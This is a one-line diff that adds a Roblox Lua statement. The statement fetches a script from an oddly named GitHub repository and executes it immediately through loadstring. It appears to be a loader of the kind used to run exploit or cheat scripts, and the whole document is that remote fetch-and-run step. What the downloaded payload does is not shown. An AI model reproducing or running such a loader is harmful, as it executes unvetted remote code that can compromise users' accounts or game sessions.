@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k93856929-lang/singlewordullsingit56yrted/main/even%20on%20more%20time.txt"))()
